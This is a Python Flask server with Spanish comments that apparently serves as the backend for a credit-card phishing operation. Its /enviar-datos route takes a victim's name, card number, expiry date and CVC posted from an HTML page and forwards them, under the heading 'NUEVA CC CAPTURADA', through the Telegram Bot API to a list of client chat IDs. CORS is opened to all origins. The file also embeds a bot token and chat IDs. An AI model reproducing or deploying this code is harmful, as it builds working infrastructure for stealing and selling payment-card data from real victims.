import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
# CORS TOTAL para que no haya bloqueos de subdominios
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- TU LISTA MAESTRA ---
# Aquí pones los IDs de tus clientes y grupos
LISTA_MAESTRA_IDS = [
    '6953415010', '7707049896', 
    '-1087968824', '1087968824'
]

# --- RUTA DE PRUEBA (PARA SABER SI EL BOT VIVE) ---
# Si entras a: https://tu-servidor.railway.app/test
# El bot te mandará un mensaje a tu Telegram para confirmar que está vivo.
@app.route('/test', methods=['GET'])
def test_bot():
    # Pon tu propio ID aquí para que el mensaje de prueba te llegue a TI
    MI_ID_PARA_TEST = '7707049896' 
    
    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": MI_ID_PARA_TEST, 
        "text": "🚀 *¡KEZOBOT ESTÁ ACTIVO Y FUNCIONANDO!* 🚀\nEl servidor responde correctamente.",
        "parse_mode": "Markdown"
    }
    
    try:
        res = requests.post(url_telegram, json=payload, timeout=5)
        if res.status_code == 200:
            return jsonify({"status": "ok", "msg": "Mensaje de test enviado a tu Telegram"}), 200
        else:
            return jsonify({"status": "error", "msg": res.text}), 500
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    # El HTML manda la lista de IDs que quieres que reciban la CC
    lista_ids_html = data.get('lista_ids', [])
    
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    # Convertimos la lista maestra a strings para que la comparación sea perfecta
    lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]

    for id_receptor in lista_ids_html:
        id_limpio = str(id_receptor).strip()

        # VALIDACIÓN DE SEGURIDAD
        if id_limpio in lista_maestra_strings:
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": id_limpio, "text": mensaje, "parse_mode": "Markdown"}
            
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                if res.status_code == 200:
                    exitos += 1
                    print(f"✅ ENVIADO EXITOSO AL ID: {id_limpio}")
                else:
                    print(f"❌ ERROR DE TELEGRAM PARA {id_limpio}: {res.text}")
            except Exception as e:
                print(f"❌ ERROR DE RED CON {id_limlio}: {e}")
        else:
            print(f"🚫 ID NO AUTORIZADO: {id_limpio}")

    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
